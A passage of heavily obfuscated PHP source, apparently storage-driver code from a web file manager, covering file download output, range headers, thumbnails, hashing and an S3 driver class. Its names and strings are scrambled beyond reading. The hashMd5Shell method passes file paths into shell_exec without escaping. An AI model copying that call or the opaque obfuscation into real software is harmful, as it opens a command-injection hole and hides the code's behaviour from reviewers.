$eèÂ±‘èÄ½[$cíµ†áÊáÈ[90]] = $f´Ëİ»¬°—; } return $eèÂ±‘èÄ½; goto f®É°Æëó; aÒ–¥êìíç: $cíµ†áÊáÈ =& $_SERVER[í…¶]; if ($this->isUploadServer()) { return; } $f´Ëİ»¬°— = $this->getType(); goto DÇİ·ÖÀ; eîì–¥ÛÏÌ: $cÔ¢Î—¹­ = $fÌÈêö¶·Ş <= $fŠƒè’†İì ? $cíµ†áÊáÈ[87] : $cíµ†áÊáÈ[88]; $A‹¥ªÍ¥î = (!$fÌÈêö¶·Ş ? 1 : ceil($fÌÈêö¶·Ş / pow(1024, 3))) * 3600 * 4; $eèÂ±‘èÄ½ = $this->{$cÔ¢Î—¹­}($eŞå¢í®Ëğ, $A‹¥ªÍ¥î); goto D¥âï¶‰ÑÅ; DÇİ·ÖÀ: if (!in_array($f´Ëİ»¬°—, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $fŠƒè’†İì = 1024 * 1024 * 10; goto eîì–¥ÛÏÌ; f®É°Æëó: } public function uploadFormData($f…æÃ¾ö£Æ, $AîİÁÖ½¥ = 3600) { } public function multiUploadFormData($dµÍ¿ÒÚ¼, $AÍ‚ÑÓñ§ï = 3600) { } public function download($f¶‚¹Úª¸Ÿ, $DÇºÅİšÒŸ) { } public function ext($b÷Ú‡ÆŠóÓ) { $EŒàÀ¢’‰ =& $_SERVER[í…¶]; if (strpos($b÷Ú‡ÆŠóÓ, $EŒàÀ¢’‰[8]) === -1) { $eŠ©õéğÁë = $b÷Ú‡ÆŠóÓ; } else { $eŠ©õéğÁë = $this->pathThis($b÷Ú‡ÆŠóÓ); } $b˜”„“Ã‡ = $EŒàÀ¢’‰[33]; if (strstr($eŠ©õéğÁë, $EŒàÀ¢’‰[91])) { $b˜”„“Ã‡ = substr($eŠ©õéğÁë, strrpos($eŠ©õéğÁë, $EŒàÀ¢’‰[91]) + 1); $b˜”„“Ã‡ = strtolower($b˜”„“Ã‡); } if (strlen($b˜”„“Ã‡) > 3 && preg_match($EŒàÀ¢’‰[92], $b˜”„“Ã‡, $cË…»¦Ùó„)) { $b˜”„“Ã‡ = $EŒàÀ¢’‰[33]; } return $b˜”„“Ã‡; } public function pathThis($c³‘¨Œ¶àÒ) { $bÓö…ÜŠ¹ =& $_SERVER[í…¶]; $c³‘¨Œ¶àÒ = str_replace($bÓö…ÜŠ¹[93], $bÓö…ÜŠ¹[8], rtrim($c³‘¨Œ¶àÒ, $bÓö…ÜŠ¹[8])); $eŞĞ Â¼ÃË = strrpos($c³‘¨Œ¶àÒ, $bÓö…ÜŠ¹[8]); if ($eŞĞ Â¼ÃË === !1) { return $c³‘¨Œ¶àÒ; } return substr($c³‘¨Œ¶àÒ, $eŞĞ Â¼ÃË + 1); } public function pathFather($c¡™ÛèÈÓ) { $DÓ²Îè­ª =& $_SERVER[í…¶]; $c¡™ÛèÈÓ = str_replace($DÓ²Îè­ª[93], $DÓ²Îè­ª[8], rtrim($c¡™ÛèÈÓ, $DÓ²Îè­ª[8])); $AÌÎÍ¹ö‘á = strrpos($c¡™ÛèÈÓ, $DÓ²Îè­ª[8]); if ($AÌÎÍ¹ö‘á === !1) { return $DÓ²Îè­ª[33]; } return substr($c¡™ÛèÈÓ, 0, $AÌÎÍ¹ö‘á + 1); } public function hashSimple($b–˜Å¡ª­¶) { goto B„ä­øğ‘„; B„ä­øğ‘„: $a„­¿øš­ =& $_SERVER[í…¶]; if (!$b–˜Å¡ª­¶) { return md5($a„­¿øš­[33]); } $B“¢İ·¾ŒŠ = $this->size($b–˜Å¡ª­¶); goto CÁÃçàÃøÈ; CÁÃçàÃøÈ: $a£ˆÙàí”Ù = 200; $aë‘œˆî”Â = 50; if ($B“¢İ·¾ŒŠ <= $a£ˆÙàí”Ù * $aë‘œˆî”Â) { return $this->hashMd5($b–˜Å¡ª­¶) . $B“¢İ·¾ŒŠ; } goto CØÉöñßÚˆ; E›×£¾Ä¶ä: $D¸¹·ô¬¥‰ .= $this->fileSubstr($b–˜Å¡ª­¶, $B“¢İ·¾ŒŠ - $a£ˆÙàí”Ù, $a£ˆÙàí”Ù); return md5($D¸¹·ô¬¥‰) . $B“¢İ·¾ŒŠ; goto bîÄƒä½‚µ; CØÉöñßÚˆ: $E¥›Ö×Ê—ó = intval($B“¢İ·¾ŒŠ / $aë‘œˆî”Â); $D¸¹·ô¬¥‰ = $a„­¿øš­[33]; for ($bÊÙôÇÕºà = 0; $bÊÙôÇÕºà < $aë‘œˆî”Â; $bÊÙôÇÕºà++) { $D¸¹·ô¬¥‰ .= $this->fileSubstr($b–˜Å¡ª­¶, $E¥›Ö×Ê—ó * $bÊÙôÇÕºà, $a£ˆÙàí”Ù); } goto E›×£¾Ä¶ä; bîÄƒä½‚µ: } public static $md5Cache = array(); public function hashMd5($AÂ²ÊÛ–¢‚) { $AÂ²ÊÛ–¢‚ = $this->iconvSystem($AÂ²ÊÛ–¢‚); if (isset(self::$md5Cache[$AÂ²ÊÛ–¢‚])) { return self::$md5Cache[$AÂ²ÊÛ–¢‚]; } self::$md5Cache[$AÂ²ÊÛ–¢‚] = $this->hashMd5Shell($AÂ²ÊÛ–¢‚); if (!self::$md5Cache[$AÂ²ÊÛ–¢‚]) { self::$md5Cache[$AÂ²ÊÛ–¢‚] = @md5_file($AÂ²ÊÛ–¢‚); } return self::$md5Cache[$AÂ²ÊÛ–¢‚]; } private function hashMd5Shell($F†¾ùò›ë) { goto aÆÂ«‡©ÜÇ; fÇŒÌã×©‘: $F••ØäÇÀÓ = Cache::get($a†Ùò”Î¶ù[97]); if (!$F••ØäÇÀÓ) { $bêšÎÍÇˆ = BASIC_PATH . $a†Ùò”Î¶ù[98]; $dİ‡İ‘¤¼ß = md5_file($bêšÎÍÇˆ); $F••ØäÇÀÓ = $a†Ùò”Î¶ù[99]; foreach ($fîÙèğÚ‘ñ as $FŸ…°ÊÔèè) { $F¤ìá—ïÜ® = shell_exec($FŸ…°ÊÔèè . "\x20\x22{$bêšÎÍÇˆ}\42"); if ($F¤ìá—ïÜ® && substr(trim($F¤ìá—ïÜ®), 0, 32) == $dİ‡İ‘¤¼ß) { $F••ØäÇÀÓ = $FŸ…°ÊÔèè; break; } } Cache::set($a†Ùò”Î¶ù[97], $F••ØäÇÀÓ, 3600); } if ($F••ØäÇÀÓ == $a†Ùò”Î¶ù[99]) { return !1; } goto DÙ‡å¦Œ¢–; DÙ‡å¦Œ¢–: $F¤ìá—ïÜ® = shell_exec($F••ØäÇÀÓ . "\40\42{$F†¾ùò›ë}\42"); $F¤ìá—ïÜ® = str_replace($a†Ùò”Î¶ù[100], $a†Ùò”Î¶ù[33], $F¤ìá—ïÜ®); return substr($F¤ìá—ïÜ®, 0, 32); goto dé´‡äğÛä; aÆÂ«‡©ÜÇ: $a†Ùò”Î¶ù =& $_SERVER[í…¶]; if (!function_exists($a†Ùò”Î¶ù[94])) { return !1; } $fîÙèğÚ‘ñ = array($a†Ùò”Î¶ù[95], $a†Ùò”Î¶ù[96]); goto fÇŒÌã×©‘; dé´‡äğÛä: } public function link($dÂê‚òÆÛ’) { return $dÂê‚òÆÛ’; } public function fileOut($Dé²‘¸Œëƒ, $Bç ô÷ÌÆº = false, $f“ìøßª¦« = false, $AìÜ®Ù‡Ò = '') { goto açí¼ŠİĞ; dœáÙ‡´ÌÄ: $f¶æ„“¸ÂÔ = 0; $C’µ¼À¥“¹ = $bÁœöÎ - 1; $DËöª£à¡Ÿ = $this->ext($EÑ»×–‹¤); goto a«šçĞÇ†; B¸ÌĞ³±èº: @ob_end_clean(); set_timeout(); $F‹†¹ƒ¤Ò¢ = $this->infoFull($Dé²‘¸Œëƒ); goto Eì×ÔÚŸœ; cÜæ‘Üê¯Œ: $cØ‰Ïá—¥Œ = get_file_mime($DËöª£à¡Ÿ); if (strstr($cØ‰Ïá—¥Œ, $F‰ğªŸÀõù[114])) { $cØ‰Ïá—¥Œ = $cØ‰Ïá—¥Œ . $F‰ğªŸÀõù[115]; } if ($Bç ô÷ÌÆº === !1 && !mime_support($cØ‰Ïá—¥Œ)) { $Bç ô÷ÌÆº = !0; $cØ‰Ïá—¥Œ = $F‰ğªŸÀõù[116]; } goto BêŠ°ãÕ£›; BØ‹Ì—Ï˜Ê: if (isset($_SERVER[$F‰ğªŸÀõù[128]]) && strtotime($_SERVER[$F‰ğªŸÀõù[128]]) == $F‹†¹ƒ¤Ò¢[$F‰ğªŸÀõù[107]]) { header($F‰ğªŸÀõù[129], !0, 304); die; } if (isset($_SERVER[$F‰ğªŸÀõù[130]]) && $_SERVER[$F‰ğªŸÀõù[130]] == $AìÜ®Ù‡Ò) { header($F‰ğªŸÀõù[131] . $AìÜ®Ù‡Ò, !0, 304); die; } header($F‰ğªŸÀõù[131] . $AìÜ®Ù‡Ò); goto CÀ••Åî –; A«íŒçµÛô: header($F‰ğªŸÀõù[125]); header($F‰ğªŸÀõù[126]); header($F‰ğªŸÀõù[127]); goto BØ‹Ì—Ï˜Ê; d«ª‰İ÷²×: if ($eŠ¬Ë‘…³) { $c¡Û¤Ê°²Î = intval(1000 * 1000 * ($dé“æÂŒÌ / $eŠ¬Ë‘…³)); } while ($f¶æ„“¸ÂÔ <= $C’µ¼À¥“¹) { $eÏ÷Ú¸ÉÊ = timeFloat(); check_abort(); $DŠÍŒÏ…›¹ = $C’µ¼À¥“¹ - $f¶æ„“¸ÂÔ + 1; if ($DŠÍŒÏ…›¹ <= $dé“æÂŒÌ) { $dé“æÂŒÌ = $DŠÍŒÏ…›¹; } echo $this->fileSubstr($Dé²‘¸Œëƒ, $f¶æ„“¸ÂÔ, $dé“æÂŒÌ); $f¶æ„“¸ÂÔ += $dé“æÂŒÌ; if ($dé“æÂŒÌ == $DŠÍŒÏ…›¹) { $f¶æ„“¸ÂÔ = $C’µ¼À¥“¹ + 1; } if ($c¡Û¤Ê°²Î) { $aø¥“—‚ƒ = intval(1000 * 1000 * (timeFloat() - $eÏ÷Ú¸ÉÊ)); $báÚ¯ª¸â¹ = $c¡Û¤Ê°²Î - $aø¥“—‚ƒ; if ($báÚ¯ª¸â¹ > 5) { usleep($báÚ¯ª¸â¹); } } } goto Aªâø±á¶Ÿ; Eì×ÔÚŸœ: $bÁœöÎ = $F‹†¹ƒ¤Ò¢[$F‰ğªŸÀõù[77]]; $aİ±¤ƒ¿ğ‚ = gmdate($F‰ğªŸÀõù[106], $F‹†¹ƒ¤Ò¢[$F‰ğªŸÀõù[107]]); $EÑ»×–‹¤ = $f“ìøßª¦« ? $f“ìøßª¦« : $this->iconvApp($F‹†¹ƒ¤Ò¢[$F‰ğªŸÀõù[28]]); goto dœáÙ‡´ÌÄ; D‰³‰éÇŠê: $Fƒğ¹ĞÒ”İ = !0; if ($_SERVER[$F‰ğªŸÀõù[151]] == $F‰ğªŸÀõù[152] && $bÁœöÎ > 1204 * 1024 * 1024 * 2) { $Fƒğ¹ĞÒ”İ = !1; } if ($Fƒğ¹ĞÒ”İ) { header($F‰ğªŸÀõù[153] . ($C’µ¼À¥“¹ - $f¶æ„“¸ÂÔ + 1)); } goto eÁ‚ÏäÇç; eÙÊä¼©òó: $Aï²£ˆÊŸø = strtolower($_SERVER[$F‰ğªŸÀõù[139]]); if ($bôéù©ô½É && $Aï²£ˆÊŸø && $C…‰è±æ±Í) { if (strstr($Aï²£ˆÊŸø, $F‰ğªŸÀõù[140])) { header($F‰ğªŸÀõù[141] . $Dé²‘¸Œëƒ); } else { if (strstr($Aï²£ˆÊŸø, $F‰ğªŸÀõù[142])) { header($F‰ğªŸÀõù[143] . $Dé²‘¸Œëƒ); } else { if (strstr($Aï²£ˆÊŸø, $F‰ğªŸÀõù[144])) { header($F‰ğªŸÀõù[145] . $Dé²‘¸Œëƒ); } } } if ($eŠ¬Ë‘…³) { header($F‰ğªŸÀõù[146] . $eŠ¬Ë‘…³); } return; } if (isset($_SERVER[$F‰ğªŸÀõù[147]])) { if (preg_match($F‰ğªŸÀõù[148], $_SERVER[$F‰ğªŸÀõù[147]], $D‰±ê„¨å)) { $f¶æ„“¸ÂÔ = intval($D‰±ê„¨å[1]); if (!empty($D‰±ê„¨å[2])) { $C’µ¼À¥“¹ = intval($D‰±ê„¨å[2]); } } header($F‰ğªŸÀõù[149]); header("\x43\157\x6e\164\x65\156\164\x2d\122\x61\156\x67\x65\x3a\x20\x62\171\x74\x65\x73\40{$f¶æ„“¸ÂÔ}\55{$C’µ¼À¥“¹}\x2f" . $bÁœöÎ); } else { header($F‰ğªŸÀõù[150]); } goto D‰³‰éÇŠê; BêŠ°ãÕ£›: $F¨Ÿ•ÚÕğ = rawurlencode($EÑ»×–‹¤); $F¨Ÿ•ÚÕğ = $F‰ğªŸÀõù[113] . $F¨Ÿ•ÚÕğ . $F‰ğªŸÀõù[117] . $F¨Ÿ•ÚÕğ; if ($Bç ô÷ÌÆº) { header($F‰ğªŸÀõù[118]); header($F‰ğªŸÀõù[119] . $F¨Ÿ•ÚÕğ); } else { header($F‰ğªŸÀõù[120] . $F¨Ÿ•ÚÕğ); } goto d¼óºÍ¨¬; BÚŒâ‚µ­å: header($F‰ğªŸÀõù[135] . $bÁœöÎ); header($F‰ğªŸÀõù[136]); if (!$Bç ô÷ÌÆº && $DËöª£à¡Ÿ == $F‰ğªŸÀõù[137]) { if ($bÁœöÎ > 1024 * 1024 * 5) { die; } $E˜ÂÂˆ¸“ã = $this->getContent($Dé²‘¸Œëƒ); $E˜ÂÂˆ¸“ã = Html::clearSVG($E˜ÂÂˆ¸“ã); header($F‰ğªŸÀõù[138] . $bÁœöÎ); echo $E˜ÂÂˆ¸“ã; die; } goto eÙÊä¼©òó; açí¼ŠİĞ: $F‰ğªŸÀõù =& $_SERVER[í…¶]; $this->cacheMethod(null, null); if (!$Dé²‘¸Œëƒ || !$this->exist($Dé²‘¸Œëƒ)) { show_json(LNG($F‰ğªŸÀõù[101]), !1, $f“ìøßª¦«); } goto eèîõé£ÒÜ; d¼óºÍ¨¬: header($F‰ğªŸÀõù[121]); header($F‰ğªŸÀõù[122] . $cØ‰Ïá—¥Œ); header($F‰ğªŸÀõù[123] . gmdate($F‰ğªŸÀõù[106], time() + 3600 * 24 * 30) . $F‰ğªŸÀõù[124]); goto A«íŒçµÛô; eÁ‚ÏäÇç: if ($_SERVER[$F‰ğªŸÀõù[154]] == $F‰ğªŸÀõù[155]) { return; } $dé“æÂŒÌ = 1024 * 100; $c¡Û¤Ê°²Î = 0; goto d«ª‰İ÷²×; CÀ••Åî –: header($F‰ğªŸÀõù[132] . $aİ±¤ƒ¿ğ‚ . $F‰ğªŸÀõù[124]); header($F‰ğªŸÀõù[133] . $EÑ»×–‹¤); header($F‰ğªŸÀõù[134]); goto BÚŒâ‚µ­å; eèîõé£ÒÜ: $bôéù©ô½É = $this->getType() == $F‰ğªŸÀõù[102]; $C…‰è±æ±Í = $GLOBALS[$F‰ğªŸÀõù[6]][$F‰ğªŸÀõù[84]][$F‰ğªŸÀõù[103]][$F‰ğªŸÀõù[104]]; $eŠ¬Ë‘…³ = (double) $GLOBALS[$F‰ğªŸÀõù[6]][$F‰ğªŸÀõù[84]][$F‰ğªŸÀõù[103]][$F‰ğªŸÀõù[105]] * 1024 * 1024; goto B¸ÌĞ³±èº; a«šçĞÇ†: if (in_array($DËöª£à¡Ÿ, array($F‰ğªŸÀõù[108], $F‰ğªŸÀõù[109], $F‰ğªŸÀõù[110], $F‰ğªŸÀõù[111]))) { $DËöª£à¡Ÿ = $F‰ğªŸÀõù[112]; } if (!$AìÜ®Ù‡Ò) { $AìÜ®Ù‡Ò = md5($aİ±¤ƒ¿ğ‚ . $this->hashSimple($Dé²‘¸Œëƒ)); } $AìÜ®Ù‡Ò = $F‰ğªŸÀõù[113] . $AìÜ®Ù‡Ò . $F‰ğªŸÀõù[113]; goto cÜæ‘Üê¯Œ; Aªâø±á¶Ÿ: } public function fileOutServer($cÙçÜâÙµ£, $BÛË†ˆ·ˆ = false, $fœğ‡Ë¦ª = false, $cÀ®ÃƒÁ‰å = '') { $this->fileOut($cÙçÜâÙµ£, $BÛË†ˆ·ˆ, $fœğ‡Ë¦ª, $cÀ®ÃƒÁ‰å); } public function fileOutLink($díğ¤È±½š) { header($_SERVER[í…¶][156] . $díğ¤È±½š); die; } public function cacheMethod($C“ë”ŒŒÀ¤, $eùê±‘ñªô) { goto cÆªŠéìé‰; aƒ«ŞáÏÁ¢: $F£Ì‰Ñ÷Äê = isset($AÃ÷”¯Ş¬Î[$cÆÑµ´µò]) ? $AÃ÷”¯Ş¬Î[$cÆÑµ´µò] : null; if (!is_null($F£Ì‰Ñ÷Äê)) { return $F£Ì‰Ñ÷Äê; } $F£Ì‰Ñ÷Äê = $this->{$C“ë”ŒŒÀ¤}($eùê±‘ñªô); goto CËÜ“À´ó™; cÆªŠéìé‰: $BƒîŸÍƒ¹Ÿ =& $_SERVER[í…¶]; static $AÃ÷”¯Ş¬Î = array(); $f×´ñæØ‡ = $eùê±‘ñªô ? ltrim($this->getPathOuter($eùê±‘ñªô), $BƒîŸÍƒ¹Ÿ[8]) : $eùê±‘ñªô; goto F‹ ÙŠ¿‹“; F‹ ÙŠ¿‹“: $cÆÑµ´µò = $BƒîŸÍƒ¹Ÿ[157] . $C“ë”ŒŒÀ¤ . $BƒîŸÍƒ¹Ÿ[158] . rtrim($f×´ñæØ‡, $BƒîŸÍƒ¹Ÿ[8]); if (is_null($C“ë”ŒŒÀ¤)) { $AÃ÷”¯Ş¬Î = array(); return; } if (is_null($eùê±‘ñªô)) { unset($AÃ÷”¯Ş¬Î[$cÆÑµ´µò]); return; } goto aƒ«ŞáÏÁ¢; CËÜ“À´ó™: $AÃ÷”¯Ş¬Î[$cÆÑµ´µò] = $F£Ì‰Ñ÷Äê; return $F£Ì‰Ñ÷Äê; goto BĞëÆ“•Ë; BĞëÆ“•Ë: } public function fileOutImage($AÒœƒÍ·­½, $f‹êÎ¦Áä¶ = 250) { goto CÇÙ…Ü†Â‚; F¾½ø’ˆõö: if ($B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[77]] <= 1024 * 50 || !function_exists($Eá·Ş‹Ê÷Ü[159]) || $B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[160]] == $Eá·Ş‹Ê÷Ü[161]) { return $this->fileOut($AÒœƒÍ·­½); } if (isset($B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[162]][$Eá·Ş‹Ê÷Ü[163]])) { $E¡é³Ü‘è‹ = $B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[162]][$Eá·Ş‹Ê÷Ü[163]]; } else { if (isset($B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[162]][$Eá·Ş‹Ê÷Ü[164]])) { $E¡é³Ü‘è‹ = $B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[162]][$Eá·Ş‹Ê÷Ü[164]]; } else { $E¡é³Ü‘è‹ = md5("{$B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[28]]}\137{$B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[75]]}\x5f{$B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[77]]}"); } } $c¹ôÓ¡µ… = "{$E¡é³Ü‘è‹}\x5f{$f‹êÎ¦Áä¶}\x2e\x70\156\147"; goto e­èÕÇŠ; e µĞ„µ: $EÎí…‹Èõ = DATA_THUMB . $c¹ôÓ¡µ…; if (!@file_exists($EÎí…‹Èõ)) { $B´†¥¾¾İ = TEMP_FILES; if (!is_dir($B´†¥¾¾İ)) { mk_dir($B´†¥¾¾İ); } $c§Şá¯Œ‚Ú = $B´†¥¾¾İ . $E¡é³Ü‘è‹ . $Eá·Ş‹Ê÷Ü[91] . $B…‹œÚîŒñ[$Eá·Ş‹Ê÷Ü[160]]; if (!@file_exists($c§Şá¯Œ‚Ú)) { $c§Şá¯Œ‚Ú = $this->download($AÒœƒÍ·­½, $c§Şá¯Œ‚Ú); } $Bµ˜îîÈ = new ImageThumb($c§Şá¯Œ‚Ú, $Eá·Ş‹Ê÷Ü[167]); $Bµ˜îîÈ->prorate($EÎí…‹Èõ, $f‹êÎ¦Áä¶, $f‹êÎ¦Áä¶ * 10); } if (!file_exists($EÎí…‹Èõ) || filesize($EÎí…‹Èõ) < 100) { return @file_exists($c§Şá¯Œ‚Ú) ? IO::fileOut($c§Şá¯Œ‚Ú) : $this->fileOut($AÒœƒÍ·­½); } goto EŞ½ª¶è; EŞ½ª¶è: if (!($E÷÷¦¢°ò‡ = IO::move($EÎí…‹Èõ, $eƒ§Ÿê¾Š‚))) { return IO::fileOut($EÎí…‹Èõ); } del_file($EÎí…‹Èõ); IO::fileOut($E÷÷¦¢°ò‡); goto aÛÛÑÚ±é‚; e­èÕÇŠ: if (!($AµÀì´ã©‡ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Eá·Ş‹Ê÷Ü[165]))) { $eƒ§Ÿê¾Š‚ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Eá·Ş‹Ê÷Ü[166]); } else { $eƒ§Ÿê¾Š‚ = KodIO::make($AµÀì´ã©‡); } if ($AµÀì´ã©‡ = IO::fileNameExist($eƒ§Ÿê¾Š‚, $c¹ôÓ¡µ…)) { $EÎí…‹Èõ = KodIO::make($AµÀì´ã©‡); return IO::fileOut($EÎí…‹Èõ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto e µĞ„µ; CÇÙ…Ü†Â‚: $Eá·Ş‹Ê÷Ü =& $_SERVER[í…¶]; if (substr($AÒœƒÍ·­½, 0, 4) == $Eá·Ş‹Ê÷Ü[144]) { $this->fileOutLink($AÒœƒÍ·­½); } $B…‹œÚîŒñ = $this->info($AÒœƒÍ·­½); goto F¾½ø’ˆõö; aÛÛÑÚ±é‚: } public function fileOutImageServer($AœÒ†×É, $B“ßÀ¼‡‰Ø = 250) { $this->fileOutImage($AœÒ†×É, $B“ßÀ¼‡‰Ø); } public function fileNameAuto($CÀÜ«¼«, $dÒÀ‚É“ÌÓ, $AêĞ…µÕƒ§ = REPEAT_RENAME, $d¥İÕÏ©Ô° = false) { goto CÌòç¦¸Âù; EïñÙ‡àĞ™: while ($this->exist(rtrim($CÀÜ«¼«, $A‡ØÖˆš‹‡[8]) . $A‡ØÖˆš‹‡[8] . $BôŠÌïğŸÊ)) { $BôŠÌïğŸÊ = $f‚äš‹É  . "\50{$cÆÚƒ†®ˆÖ}\x29{$AÇ±Ä¬ñ‰}"; $cÆÚƒ†®ˆÖ++; } return $BôŠÌïğŸÊ; goto CàÙ‚ùè¼®; BãäÅ‚Ì: $cÆÚƒ†®ˆÖ = 1; $f‚äš‹É  = substr($dÒÀ‚É“ÌÓ, 0, strlen($dÒÀ‚É“ÌÓ) - strlen($AÇ±Ä¬ñ‰)); $BôŠÌïğŸÊ = $f‚äš‹É  . "\50{$cÆÚƒ†®ˆÖ}\51{$AÇ±Ä¬ñ‰}"; goto EïñÙ‡àĞ™; CÌòç¦¸Âù: $A‡ØÖˆš‹‡ =& $_SERVER[í…¶]; $c¹»Ç¢·® = $CÀÜ«¼« === $A‡ØÖˆš‹‡[33] ? $dÒÀ‚É“ÌÓ : rtrim($CÀÜ«¼«, $A‡ØÖˆš‹‡[8]) . $A‡ØÖˆš‹‡[8] . $dÒÀ‚É“ÌÓ; if ($AêĞ…µÕƒ§ == REPEAT_REPLACE || !$this->exist($c¹»Ç¢·®) || $d¥İÕÏ©Ô° && $AêĞ…µÕƒ§ != REPEAT_RENAME_FOLDER) { return $dÒÀ‚É“ÌÓ; } goto E‰Ü—§Á´; E‰Ü—§Á´: if ($AêĞ…µÕƒ§ == REPEAT_SKIP) { return !1; } $AÇ±Ä¬ñ‰ = $A‡ØÖˆš‹‡[91] . get_path_ext($dÒÀ‚É“ÌÓ); $AÇ±Ä¬ñ‰ = $AÇ±Ä¬ñ‰ == $A‡ØÖˆš‹‡[91] || $d¥İÕÏ©Ô° ? $A‡ØÖˆš‹‡[33] : $AÇ±Ä¬ñ‰; goto BãäÅ‚Ì; CàÙ‚ùè¼®: } public function listAllFiles($fæ‚ãˆ¸–, $d˜¶ğÖÎ‘Ö, $E½±½è = array()) { goto A²ö©à”µÇ; DŠ¡¯¨Å¨ô: $fæ‚ãˆ¸– = trim($fæ‚ãˆ¸–, $aèõµÌ¶³‘[8]); foreach ($d˜¶ğÖÎ‘Ö as $BºÁ–„Éš) { $eáÉíğ¢•© = ltrim(substr($BºÁ–„Éš, strlen($fæ‚ãˆ¸–)), $aèõµÌ¶³‘[8]); $fôæˆÓÓªÄ = array_merge($fôæˆÓÓªÄ, $this->slicePath($eáÉíğ¢•©)); } $DÕç§ÎàÌ = array(); goto CÈà¬¹«®; CÈà¬¹«®: foreach (array_unique($fôæˆÓÓªÄ) as $BºÁ–„Éš) { $B…ª£”Í½Ÿ = array($aèõµÌ¶³‘[75] => $this->getPathOuter($aèõµÌ¶³‘[8] . $fæ‚ãˆ¸– . $aèõµÌ¶³‘[8] . $BºÁ–„Éš), $aèõµÌ¶³‘[76] => 1, $aèõµÌ¶³‘[77] => 0); if (substr($BºÁ–„Éš, -1) != $aèõµÌ¶³‘[8]) { $B…ª£”Í½Ÿ[$aèõµÌ¶³‘[76]] = 0; $F‘÷Ûî¦—ô = $this->getPath($fæ‚ãˆ¸– . $aèõµÌ¶³‘[8] . $BºÁ–„Éš); $B…ª£”Í½Ÿ[$aèõµÌ¶³‘[77]] = isset($E½±½è[$F‘÷Ûî¦—ô]) ? $E½±½è[$F‘÷Ûî¦—ô] : $this->size($F‘÷Ûî¦—ô); } $DÕç§ÎàÌ[] = $B…ª£”Í½Ÿ; } return $DÕç§ÎàÌ; goto DÀÛŒ²§‘³; A²ö©à”µÇ: $aèõµÌ¶³‘ =& $_SERVER[í…¶]; if (empty($d˜¶ğÖÎ‘Ö)) { return array(); } $fôæˆÓÓªÄ = array(); goto DŠ¡¯¨Å¨ô; DÀÛŒ²§‘³: } public function slicePath($bÌÌŸÒØŠ) { $f…¯†ÚÖ¸ =& $_SERVER[í…¶]; $dï½Ÿ¤Ä = explode($f…¯†ÚÖ¸[8], trim($bÌÌŸÒØŠ, $f…¯†ÚÖ¸[8])); $DÁê»ğ® = 0; do { ++$DÁê»ğ®; $eß‰°œ ¼[] = implode($f…¯†ÚÖ¸[8], array_slice($dï½Ÿ¤Ä, 0, $DÁê»ğ®)) . $f…¯†ÚÖ¸[8]; } while ($DÁê»ğ® < count($dï½Ÿ¤Ä)); $eß‰°œ ¼[count($dï½Ÿ¤Ä) - 1] = $bÌÌŸÒØŠ; return $eß‰°œ ¼; } public function getHost() { $cÈã•ÛŠÃâ =& $_SERVER[í…¶]; $bŸŒ†âùáô = parse_url(trim($this->domain, $cÈã•ÛŠÃâ[8])); $D™ñáˆÌĞó = isset($bŸŒ†âùáô[$cÈã•ÛŠÃâ[168]]) ? $bŸŒ†âùáô[$cÈã•ÛŠÃâ[168]] : http_type(); $a‡¥ ©‹¡ß = isset($bŸŒ†âùáô[$cÈã•ÛŠÃâ[169]]) ? $bŸŒ†âùáô[$cÈã•ÛŠÃâ[169]] : $bŸŒ†âùáô[$cÈã•ÛŠÃâ[75]]; if (isset($bŸŒ†âùáô[$cÈã•ÛŠÃâ[170]])) { $a‡¥ ©‹¡ß .= $cÈã•ÛŠÃâ[4] . $bŸŒ†âùáô[$cÈã•ÛŠÃâ[170]]; } return $D™ñáˆÌĞó . $cÈã•ÛŠÃâ[171] . $a‡¥ ©‹¡ß; } public function pathEncode($dšË¸ÄíÚ) { $aİĞÄÁší =& $_SERVER[í…¶]; return str_replace($aİĞÄÁší[172], $aİĞÄÁší[8], rawurlencode($dšË¸ÄíÚ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($e©½„í§ôé) { set_timeout(); require_once SDK_DIR . $_SERVER[í…¶][173]; parent::__construct(); $this->_init($e©½„í§ôé); } public function _init($E­¾“Ö´«˜) { foreach ($E­¾“Ö´«˜ as $aÂÈ†æî¢ => $c•“”à’¦) { if (isset($this->{$aÂÈ†æî¢})) { $this->{$aÂÈ†æî¢} = $c•“”à’¦; } } $this->endpoint = $E­¾“Ö´«˜[$_SERVER[í…¶][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($C«¾…Ş¦Óğ = "\166\x34") { $this->signVer = $C«¾…Ş¦Óğ; $this->client->setSignatureVersion($C«¾…Ş¦Óğ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto F¶ôÅƒ¡ƒ·; F¶ôÅƒ¡ƒ·: $dŒæèª¡¾¿ =& $_SERVER[í…¶]; $b†ÀÛØÛ£Ü = $this->getBucketCors(); if (!$b†ÀÛØÛ£Ü || !is_array($b†ÀÛØÛ£Ü)) { return !1; } goto E³‡µÛ°ç; D‘†óŠŞ†Æ: $Bé÷‹œÉ¥´ = array($dŒæèª¡¾¿[180], $dŒæèª¡¾¿[181], $dŒæèª¡¾¿[182], $dŒæèª¡¾¿[183], $dŒæèª¡¾¿[184]); $fñæÚ´„â’ = array_diff($Bé÷‹œÉ¥´, $f¦ã²Ä•øŒ); return empty($fñæÚ´„â’); goto FÎ†©³ß¬¿; E³‡µÛ°ç: if ($b†ÀÛØÛ£Ü[$dŒæèª¡¾¿[175]] != 